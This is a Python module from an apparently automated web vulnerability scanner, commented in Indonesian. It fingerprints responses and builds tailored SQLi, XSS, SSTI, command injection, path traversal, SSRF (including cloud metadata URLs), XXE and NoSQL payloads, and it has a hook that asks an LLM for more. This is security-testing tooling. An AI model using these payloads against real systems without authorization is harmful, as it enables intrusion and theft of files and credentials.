"""Sintesis payload dari fakta respons — bukan katalog kedua.

Masalah yang diselesaikan: katalog statis berguna sebagai lantai, tetapi tidak
tahu bahwa endpoint yang sedang diuji memakai MySQL, memantulkan input di dalam
atribut `class="…"`, atau berjalan di Windows. Modul ini membaca sinyal respons
(status, header, body, parameter) lalu MENYUSUN payload dari grammar per-konteks.

Klaim yang sengaja tidak dibuat: ini bukan bukti bahwa target rentan. Setiap
payload hanya kandidat; verdict tetap milik `verify.deterministic` setelah probe
dijalankan dan dibandingkan dengan baseline.
"""

from __future__ import annotations

import hashlib
import json
import re
from dataclasses import dataclass, field
from typing import Any, Iterable, Mapping, Sequence
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit

from wth_ai.adaptive.signals import classify as classify_signal
from wth_ai.hunt.proactive import NextTest

SQL_ERROR_PATTERNS: tuple[tuple[str, str], ...] = (
    ("mysql", r"(you have an error in your sql syntax|mysql_fetch|mariadb|sqlstate\[hy000\])"),
    ("postgres", r"(postgresql|pg::syntaxerror|syntax error at or near|psql:)"),
    ("mssql", r"(microsoft sql server|unclosed quotation mark|sqlserver|odbc sql server)"),
    ("sqlite", r"(sqlite3?|no such table|sqlite error)"),
    ("oracle", r"(ora-\d{4,}|oracle error)"),
)

FRAMEWORK_SIGNATURES: tuple[tuple[str, str], ...] = (
    ("spring", r"(whitelabel error page|org\.springframework|spring boot)"),
    ("laravel", r"(laravel|illuminate\\|whoops!)"),
    ("django", r"(django|csrfmiddlewaretoken|disallowedhost)"),
    ("flask", r"(flask|werkzeug|jinja2)"),
    ("rails", r"(ruby on rails|actioncontroller|activerecord)"),
    ("express", r"(express|node\.js)"),
    ("php", r"(php|laravel|symfony)"),
    ("aspnet", r"(asp\.net|__viewstate|request validation)"),
)

_SQLI_CLASSES = {"sqli"}
_XSS_CLASSES = {"xss"}
_SSTI_CLASSES = {"ssti"}
_CMDI_CLASSES = {"cmdi", "command_injection", "rce"}
_TRAVERSAL_CLASSES = {"path_traversal", "lfi", "file_path", "traversal"}
_SSRF_CLASSES = {"ssrf"}
_REDIRECT_CLASSES = {"open_redirect", "redirect"}
_XXE_CLASSES = {"xxe", "xml_external_entity"}
_NOSQL_CLASSES = {"nosql", "nosql_injection"}

SYNTH_CLASSES = (
    _SQLI_CLASSES | _XSS_CLASSES | _SSTI_CLASSES | _CMDI_CLASSES
    | _TRAVERSAL_CLASSES | _SSRF_CLASSES | _REDIRECT_CLASSES
    | _XXE_CLASSES | _NOSQL_CLASSES
)


def _headers_lower(headers: Mapping[str, Any] | None) -> dict[str, str]:
    return {str(k).lower(): str(v) for k, v in (headers or {}).items()}


def _first_param(url: str) -> str:
    query = urlsplit(str(url or "")).query
    for key, _value in parse_qsl(query, keep_blank_values=True):
        return key
    return ""


def _json_first_key(body: str) -> str:
    try:
        data = json.loads(body)
    except (TypeError, json.JSONDecodeError):
        return ""
    if isinstance(data, dict):
        return str(next(iter(data), ""))
    return ""


def _form_first_key(body: str) -> str:
    for key, _value in parse_qsl(body or "", keep_blank_values=True):
        return key
    return ""


def _detect_dbms(text: str) -> str:
    lowered = (text or "").lower()
    for name, pattern in SQL_ERROR_PATTERNS:
        if re.search(pattern, lowered, re.IGNORECASE):
            return name
    return ""


def _detect_framework(headers: Mapping[str, str], body: str) -> str:
    blob = " ".join([*(str(v) for v in headers.values()), body or ""]).lower()
    if "x-powered-by" in headers:
        powered = headers["x-powered-by"].lower()
        if "php" in powered:
            return "php"
        if "asp.net" in powered:
            return "aspnet"
        if "express" in powered:
            return "express"
    for name, pattern in FRAMEWORK_SIGNATURES:
        if re.search(pattern, blob, re.IGNORECASE):
            return name
    return ""


def _detect_os(headers: Mapping[str, str], body: str) -> str:
    blob = " ".join([*(str(v) for v in headers.values()), body or ""]).lower()
    if any(word in blob for word in ("microsoft-iis", "win32", "windows nt", "c:\\windows")):
        return "windows"
    if any(word in blob for word in ("ubuntu", "debian", "linux", "unix")):
        return "linux"
    return ""


def _reflection_context(body: str, param_value: str, marker: str = "") -> tuple[str, str]:
    """Kembalikan (konteks, marker) dari lokasi pantulan pertama.

    Konteks yang dikenali: html, attr_dq, attr_sq, attr_unquoted, js, encoded.
    Ini yang membuat payload XSS berubah bentuk: breakout untuk text node tidak
    sama dengan breakout untuk atribut ber-quote.
    """
    text = body or ""
    needles = [marker] if marker else []
    if param_value and len(param_value) >= 4:
        needles.append(param_value)
    needles.extend(re.findall(r"wth[A-Za-z0-9]{4,}", text))
    found = ""
    index = -1
    for needle in needles:
        if not needle:
            continue
        index = text.find(needle)
        if index >= 0:
            found = needle
            break
    if index < 0:
        return "", ""

    before = text[max(0, index - 160):index]
    lowered = before.lower()
    if lowered.rfind("<script") > lowered.rfind("</script"):
        return "js", found
    tag_start = before.rfind("<")
    tag = before[tag_start:] if tag_start >= 0 else ""
    if tag:
        if tag.count('"') % 2 == 1:
            return "attr_dq", found
        if tag.count("'") % 2 == 1:
            return "attr_sq", found
        if "=" in tag and not tag.rstrip().endswith("="):
            return "attr_unquoted", found
    if "&lt;" in text[max(0, index - 20):index + len(found) + 20]:
        return "encoded", found
    return "html", found


def _infer_request_body_param(pair: Mapping[str, Any]) -> tuple[str, str, str]:
    """(param, body, body_kind) — body_kind: json | form | xml | ''."""
    body = str(pair.get("body") or pair.get("request_body") or "")
    headers = _headers_lower(pair.get("request_headers") if isinstance(pair.get("request_headers"), Mapping) else {})
    ctype = headers.get("content-type", "").lower()
    stripped = body.lstrip()
    if "json" in ctype or stripped.startswith("{") or stripped.startswith("["):
        return _json_first_key(body), body, "json"
    if "xml" in ctype or stripped.startswith("<?xml") or stripped.startswith("<!DOCTYPE"):
        return "", body, "xml"
    if body:
        return _form_first_key(body), body, "form"
    return "", "", ""


@dataclass(frozen=True)
class ServerProfile:
    """Fakta respons yang menggerakkan sintesis; tanpa body penuh di repr."""

    url: str
    method: str = "GET"
    param: str = ""
    status: int = 0
    body: str = field(default="", repr=False)
    headers: Mapping[str, str] = field(default_factory=dict, repr=False)
    request_body: str = field(default="", repr=False)
    body_kind: str = ""
    content_type: str = ""
    waf: str = ""
    dbms: str = ""
    framework: str = ""
    os_hint: str = ""
    reflection_context: str = ""
    reflected_marker: str = ""
    path_depth: int = 0
    json_like: bool = False
    xml_like: bool = False

    @classmethod
    def from_pair(cls, pair: Mapping[str, Any], *, marker: str = "") -> "ServerProfile":
        url = str(pair.get("url") or pair.get("target") or "")
        method = str(pair.get("method") or "GET").upper()
        status = int(pair.get("response_status") or pair.get("status_code") or 0)
        body = str(pair.get("body_snippet") or pair.get("body") or pair.get("stdout") or "")
        headers = _headers_lower(pair.get("response_headers") if isinstance(pair.get("response_headers"), Mapping) else {})
        param = _first_param(url)
        body_param, request_body, body_kind = _infer_request_body_param(pair)
        if not param:
            param = body_param
        value = ""
        for key, val in parse_qsl(urlsplit(url).query, keep_blank_values=True):
            if key == param:
                value = val
                break
        context, reflected = _reflection_context(body, value, marker=marker)
        signal = classify_signal(status, headers, body)
        path = urlsplit(url).path or "/"
        content_type = headers.get("content-type", "")
        json_like = "json" in content_type.lower() or body.lstrip().startswith(("{", "["))
        xml_like = "xml" in content_type.lower() or body.lstrip().startswith(("<?xml", "<!DOCTYPE"))
        return cls(
            url=url, method=method, param=param, status=status, body=body, headers=headers,
            request_body=request_body, body_kind=body_kind, content_type=content_type,
            waf=signal.vendor if signal.kind in {"waf", "blocked"} else "",
            dbms=_detect_dbms(body), framework=_detect_framework(headers, body),
            os_hint=_detect_os(headers, body), reflection_context=context,
            reflected_marker=reflected, path_depth=max(0, len([p for p in path.split("/") if p]) - 1),
            json_like=json_like, xml_like=xml_like,
        )

    def to_dict(self) -> dict[str, Any]:
        return {
            "url": self.url, "method": self.method, "param": self.param,
            "status": self.status, "content_type": self.content_type,
            "waf": self.waf, "dbms": self.dbms, "framework": self.framework,
            "os_hint": self.os_hint, "reflection_context": self.reflection_context,
            "reflected_marker": self.reflected_marker, "path_depth": self.path_depth,
            "json_like": self.json_like, "xml_like": self.xml_like,
        }

    def summary(self) -> str:
        facts = [
            f"status={self.status}",
            f"param={self.param or '-'}",
            f"dbms={self.dbms or '-'}",
            f"framework={self.framework or '-'}",
            f"os={self.os_hint or '-'}",
            f"reflect={self.reflection_context or '-'}",
            f"waf={self.waf or '-'}",
        ]
        return ", ".join(facts)


@dataclass(frozen=True)
class SynthProbe:
    """Payload hasil sintesis + alasan dan sinyal yang diharapkan."""

    vuln_class: str
    title: str
    rationale: str
    probe: dict[str, Any]
    expected: tuple[str, ...] = ()
    risk: str = "low"
    priority: float = 1.0
    context: str = ""

    def to_next_test(self, *, source_finding: str = "") -> NextTest:
        return NextTest(
            title=self.title,
            rationale=self.rationale,
            probe=dict(self.probe),
            risk=self.risk,
            priority=self.priority,
            source_finding=source_finding,
            vuln_class=self.vuln_class,
        )


def _replace_query(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    replaced = False
    out: list[tuple[str, str]] = []
    for key, old in pairs:
        if key == param:
            out.append((key, value))
            replaced = True
        else:
            out.append((key, old))
    if not replaced:
        out.append((param, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(out, doseq=True, quote_via=quote), parts.fragment))


def _replace_body(profile: ServerProfile, value: Any) -> dict[str, Any] | None:
    if profile.body_kind == "json":
        try:
            data = json.loads(profile.request_body)
        except (TypeError, json.JSONDecodeError):
            return None
        if not isinstance(data, dict) or not profile.param:
            return None
        data[profile.param] = value
        return {
            "method": profile.method or "POST",
            "url": profile.url,
            "body": json.dumps(data),
            "headers": {"Content-Type": "application/json"},
        }
    if profile.body_kind == "form" and profile.param:
        pairs = parse_qsl(profile.request_body, keep_blank_values=True)
        replaced = False
        out: list[tuple[str, str]] = []
        for key, old in pairs:
            if key == profile.param:
                out.append((key, str(value)))
                replaced = True
            else:
                out.append((key, old))
        if not replaced:
            out.append((profile.param, str(value)))
        return {
            "method": profile.method or "POST",
            "url": profile.url,
            "body": urlencode(out, doseq=True, quote_via=quote),
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        }
    return None


def _probe_for(profile: ServerProfile, value: Any, *, method: str | None = None) -> dict[str, Any]:
    if profile.param:
        body_probe = _replace_body(profile, value)
        if body_probe is not None:
            return body_probe
        return {"method": method or profile.method or "GET", "url": _replace_query(profile.url, profile.param, str(value))}
    return {"method": method or profile.method or "GET", "url": profile.url}


def _marker(url: str) -> str:
    return "wth" + hashlib.sha256(url.encode("utf-8", "replace")).hexdigest()[:6]


def _sqli(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    dbms = profile.dbms or "generic"
    if dbms == "mysql":
        rows = [
            ("' AND (SELECT 1 FROM (SELECT SLEEP(2))x)-- -", ("time_delta>=2s",), "time-based MySQL"),
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -", ("XPATH syntax error",), "error-based MySQL"),
            ("' UNION SELECT NULL,@@version-- -", ("version_banner",), "union MySQL"),
        ]
    elif dbms == "postgres":
        rows = [
            ("' AND 1=(SELECT 1 FROM pg_sleep(2))-- -", ("time_delta>=2s",), "time-based PostgreSQL"),
            ("' AND CAST((SELECT version()) AS int)-- -", ("invalid input syntax",), "error-based PostgreSQL"),
        ]
    elif dbms == "mssql":
        rows = [
            ("'; WAITFOR DELAY '0:0:2'-- -", ("time_delta>=2s",), "time-based MSSQL"),
            ("' AND 1=CONVERT(int,@@version)-- -", ("conversion failed",), "error-based MSSQL"),
        ]
    elif dbms == "sqlite":
        rows = [
            ("' AND 1=randomblob(500000000)-- -", ("time_delta>=2s",), "time-based SQLite"),
            ("' UNION SELECT NULL,sqlite_version()-- -", ("version_banner",), "union SQLite"),
        ]
    elif dbms == "oracle":
        rows = [
            ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -", ("ORA-",), "error-based Oracle"),
        ]
    else:
        rows = [
            ("' AND 1=1-- -", ("boolean_true",), "boolean probe"),
            ("' AND 1=2-- -", ("boolean_false",), "boolean probe"),
            ("'", ("sql_error",), "quote probe"),
        ]
    out = []
    for value, expected, why in rows[:max(1, limit)]:
        out.append(SynthProbe(
            vuln_class="sqli",
            title=f"Sintesis SQLi {dbms} ({why})",
            rationale=f"Respons menunjukkan sinyal {dbms}; payload disusun untuk dialek itu. {profile.summary()}",
            probe=_probe_for(profile, value),
            expected=expected,
            risk="low",
            priority=0.98,
            context=f"dbms={dbms}",
        ))
    return out


def _xss(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    marker = _marker(profile.url)
    context = profile.reflection_context or "html"
    rows = {
        "html": [f"<svg/onload=alert('{marker}')>", f"'><svg/onload=alert('{marker}')>"],
        "attr_dq": [f'" autofocus onfocus=alert(\'{marker}\') x="', f"'><svg/onload=alert('{marker}')>"],
        "attr_sq": [f"' autofocus onfocus=alert('{marker}') x='", f"'><svg/onload=alert('{marker}')>"],
        "attr_unquoted": [f" autofocus onfocus=alert('{marker}') x=", f"'><svg/onload=alert('{marker}')>"],
        "js": [f"';alert('{marker}');//", f"</script><svg/onload=alert('{marker}')>"],
        "encoded": [f"<script>alert('{marker}')</script>", f"<img src=x onerror=alert('{marker}')>"],
    }.get(context, [f"<script>alert('{marker}')</script>"])
    out = []
    for value in rows[:max(1, limit)]:
        out.append(SynthProbe(
            vuln_class="xss",
            title=f"Sintesis XSS konteks {context}",
            rationale=(
                f"Input dipantulkan di konteks {context}; breakout disusun untuk konteks itu, "
                f"bukan payload generik. marker={marker}. {profile.summary()}"
            ),
            probe=_probe_for(profile, value),
            expected=(value, marker, f"context:{context}"),
            risk="low",
            priority=0.96,
            context=context,
        ))
    return out


def _ssti(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    framework = profile.framework
    candidates: list[tuple[str, str, str]] = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("${7*7}", "49", "Freemarker/Velocity"),
        ("#{7*7}", "49", "Thymeleaf/Ruby"),
        ("<%= 7*7 %>", "49", "ERB/EJS"),
    ]
    if framework in {"flask", "django"}:
        candidates += [("{{7*7}}", "49", "Jinja2/Django"), ("{{7*'7'}}", "7777777", "Jinja2")]
    if framework in {"spring", "java"}:
        candidates += [("${7*7}", "49", "Spring EL"), ("#{7*7}", "49", "Spring EL")]
    if framework == "laravel":
        candidates += [("{{7*7}}", "49", "Twig")]
    out = []
    for value, expected, engine in candidates[:max(1, limit)]:
        out.append(SynthProbe(
            vuln_class="ssti",
            title=f"Sintesis SSTI {engine}",
            rationale=f"Framework={framework or 'tidak diketahui'}; ekspresi {value} harus jadi {expected} bila dievaluasi. {profile.summary()}",
            probe=_probe_for(profile, value),
            expected=(expected,),
            risk="low",
            priority=0.97,
            context=f"engine={engine}",
        ))
    return out


def _cmdi(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    windows = profile.os_hint == "windows"
    command = "whoami" if windows else "id"
    expected = "windows_user" if windows else "uid="
    separators = [";", "|", "||", "&&", "$(", "`"]
    out = []
    for sep in separators[:max(1, limit)]:
        value = f"{sep}{command}" + (")" if sep == "$(" else ("`" if sep == "`" else ""))
        out.append(SynthProbe(
            vuln_class="cmdi",
            title=f"Sintesis command injection ({sep})",
            rationale=f"OS={profile.os_hint or 'unknown'}; separator {sep!r} + {command} membuktikan eksekusi. {profile.summary()}",
            probe=_probe_for(profile, value),
            expected=(expected,),
            risk="low",
            priority=0.95,
            context=f"os={profile.os_hint or 'unknown'}",
        ))
    return out


def _traversal(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    depth = max(3, profile.path_depth + 1)
    linux = "../" * depth + "etc/passwd"
    encoded = "%2e%2e%2f" * depth + "etc%2fpasswd"
    bypass = "....//" * depth + "etc/passwd"
    windows = "..\\" * depth + "windows\\win.ini"
    rows = [
        (linux, "root:x:0:0:", "linux_plain"),
        (encoded, "root:x:0:0:", "linux_urlenc"),
        (bypass, "root:x:0:0:", "filter_bypass"),
        (windows, "[fonts]", "windows_plain"),
    ]
    if profile.param and profile.url.split("?")[0].endswith((".php", ".asp", ".jsp")):
        rows.append(("php://filter/convert.base64-encode/resource=index.php", "PD9waHA", "php_filter"))
    out = []
    for value, expected, why in rows[:max(1, limit)]:
        out.append(SynthProbe(
            vuln_class="path_traversal",
            title=f"Sintesis LFI/traversal ({why})",
            rationale=f"Kedalaman path={profile.path_depth}; payload naik {depth} level. {profile.summary()}",
            probe=_probe_for(profile, value),
            expected=(expected,),
            risk="low",
            priority=0.94,
            context=why,
        ))
    return out


def _ssrf(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    rows = [
        ("http://127.0.0.1/", ("internal_response",), "loopback"),
        ("http://localhost/", ("internal_response",), "localhost"),
        ("http://[::1]/", ("internal_response",), "ipv6_loopback"),
        ("http://0x7f000001/", ("internal_response",), "hex_ip"),
        ("http://2130706433/", ("internal_response",), "decimal_ip"),
        ("http://169.254.169.254/latest/meta-data/", ("cloud_metadata",), "aws_metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/", ("cloud_metadata",), "gcp_metadata"),
    ]
    out = []
    for value, expected, why in rows[:max(1, limit)]:
        out.append(SynthProbe(
            vuln_class="ssrf",
            title=f"Sintesis SSRF ({why})",
            rationale=f"Parameter URL-like; target internal ditulis dalam bentuk {why}. {profile.summary()}",
            probe=_probe_for(profile, value),
            expected=expected,
            risk="medium",
            priority=0.93,
            context=why,
        ))
    return out


def _open_redirect(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    rows = [
        ("https://example.org/", ("Location: example.org",), "absolute"),
        ("//example.org/", ("Location: example.org",), "scheme_relative"),
        ("https:example.org", ("Location: example.org",), "scheme_no_slashes"),
        ("/\\example.org", ("Location: example.org",), "backslash"),
        ("https://target.example@example.org/", ("Location: example.org",), "userinfo"),
    ]
    out = []
    for value, expected, why in rows[:max(1, limit)]:
        out.append(SynthProbe(
            vuln_class="open_redirect",
            title=f"Sintesis open redirect ({why})",
            rationale=f"Parameter redirect-like; variasi {why} menguji parser tujuan. {profile.summary()}",
            probe={**_probe_for(profile, value), "follow_redirects": False},
            expected=expected,
            risk="low",
            priority=0.9,
            context=why,
        ))
    return out


def _xxe(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    body = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
        '<r>&x;</r>'
    )
    return [SynthProbe(
        vuln_class="xxe",
        title="Sintesis XXE file disclosure",
        rationale=f"Endpoint menerima XML; entitas eksternal diarahkan ke file lokal. {profile.summary()}",
        probe={
            "method": "POST", "url": profile.url, "body": body,
            "headers": {"Content-Type": "application/xml"},
        },
        expected=("root:x:0:0:",),
        risk="medium",
        priority=0.92,
        context="xml",
    )][:max(1, limit)]


def _nosql(profile: ServerProfile, limit: int) -> list[SynthProbe]:
    if profile.body_kind == "json" and profile.param:
        probe = _replace_body(profile, {"$ne": None})
        if probe is not None:
            return [SynthProbe(
                vuln_class="nosql",
                title="Sintesis NoSQL operator injection",
                rationale=f"Body JSON dengan field {profile.param!r}; operator $ne menggantikan nilai. {profile.summary()}",
                probe=probe,
                expected=("auth_bypass", "json_field_diff"),
                risk="medium",
                priority=0.91,
                context="json",
            )][:max(1, limit)]
    if profile.param:
        value = '{"$ne":null}'
        return [SynthProbe(
            vuln_class="nosql",
            title="Sintesis NoSQL operator injection",
            rationale=f"Parameter {profile.param!r} diuji dengan operator $ne. {profile.summary()}",
            probe=_probe_for(profile, value),
            expected=("auth_bypass", "json_field_diff"),
            risk="medium",
            priority=0.88,
            context="query",
        )][:max(1, limit)]
    return []


def synthesize_payloads(profile: ServerProfile, vuln_class: str, *, limit: int = 3) -> list[SynthProbe]:
    """Susun kandidat payload untuk satu kelas berdasarkan profil respons."""
    klass = (vuln_class or "").strip().lower().replace("-", "_").replace(" ", "_")
    if klass in _SQLI_CLASSES:
        return _sqli(profile, limit)
    if klass in _XSS_CLASSES:
        return _xss(profile, limit)
    if klass in _SSTI_CLASSES:
        return _ssti(profile, limit)
    if klass in _CMDI_CLASSES:
        return _cmdi(profile, limit)
    if klass in _TRAVERSAL_CLASSES:
        return _traversal(profile, limit)
    if klass in _SSRF_CLASSES:
        return _ssrf(profile, limit)
    if klass in _REDIRECT_CLASSES:
        return _open_redirect(profile, limit)
    if klass in _XXE_CLASSES:
        return _xxe(profile, limit)
    if klass in _NOSQL_CLASSES:
        return _nosql(profile, limit)
    return []


def _signal_classes(profile: ServerProfile) -> set[str]:
    classes: set[str] = set()
    if profile.dbms:
        classes.add("sqli")
    if profile.reflection_context:
        classes.add("xss")
    if profile.framework:
        classes.add("ssti")
    low = (profile.body or "").lower()
    if "root:x:0:0:" in low:
        classes.add("path_traversal")
    if "uid=" in low and "gid=" in low:
        classes.add("cmdi")
    if "169.254.169.254" in low or "meta-data" in low:
        classes.add("ssrf")
    return classes


def synthesize_next_tests(
    *,
    findings: Iterable[Any] = (),
    request_pairs: Iterable[Mapping[str, Any]] = (),
    limit: int = 4,
) -> list[NextTest]:
    """Ubah fakta respons menjadi usulan probe yang benar-benar baru.

    Satu endpoint/kelas menghasilkan satu kandidat terbaik agar tidak menabrak
    dedupe URL+method di autopilot. Kandidat lain tetap tersedia lewat
    `synthesize_payloads()` untuk pemanggilan eksplisit.
    """
    profiles: list[ServerProfile] = []
    for pair in request_pairs:
        if not isinstance(pair, Mapping):
            continue
        profile = ServerProfile.from_pair(pair)
        if profile.url:
            profiles.append(profile)

    wanted: set[str] = set()
    for finding in findings:
        data = finding if isinstance(finding, Mapping) else getattr(finding, "__dict__", {}) or {}
        klass = str(data.get("vuln_class") or data.get("type") or "").strip().lower()
        try:
            from wth_ai.verify.deterministic import normalize_class

            klass = normalize_class(klass)
        except Exception:  # noqa: BLE001
            pass
        if klass in SYNTH_CLASSES:
            wanted.add(klass)
    for profile in profiles:
        wanted.update(_signal_classes(profile))

    out: list[NextTest] = []
    seen: set[tuple[str, str]] = set()
    for profile in profiles:
        for klass in sorted(wanted):
            candidates = synthesize_payloads(profile, klass, limit=3)
            if not candidates:
                continue
            best = max(candidates, key=lambda c: c.priority)
            key = (str(best.probe.get("method", "")).upper(), str(best.probe.get("url", "")))
            if key in seen:
                continue
            seen.add(key)
            out.append(best.to_next_test())
            if len(out) >= max(1, limit):
                return out
    return out


def synthesize_with_llm(router: Any, profile: ServerProfile, vuln_class: str, *, limit: int = 3) -> list[SynthProbe]:
    """Jalur LLM: profil respons menjadi konteks prompt; hasil tetap divalidasi.

    Tidak dipanggil otomatis oleh planner deterministik. Ini hook eksplisit untuk
    orchestrator/supervisor yang memang punya router dan ingin sintesis bebas.
    """
    from wth_ai.hunt.generator import generate_with_llm

    goal = (
        f"Target {profile.method} {profile.url}; param={profile.param or '-'}; "
        f"fakta respons: {profile.summary()}. Susun payload {vuln_class} yang menguji "
        "hipotesis ini, bukan payload generik."
    )
    result = generate_with_llm(
        router, vuln_class=vuln_class, goal=goal,
        tech_stack=profile.framework or profile.dbms or "unknown",
        count=max(1, limit),
    )
    out: list[SynthProbe] = []
    for payload in result.accepted:
        probe = dict(payload.probe)
        for key, value in list(probe.items()):
            if isinstance(value, str):
                probe[key] = value.replace("{base}", profile.url).replace("{marker}", _marker(profile.url))
        out.append(SynthProbe(
            vuln_class=vuln_class,
            title=payload.title,
            rationale=f"LLM synthesis: {payload.proves}; konteks: {profile.summary()}",
            probe=probe,
            expected=(),
            risk="medium",
            priority=0.9,
            context="llm",
        ))
    return out
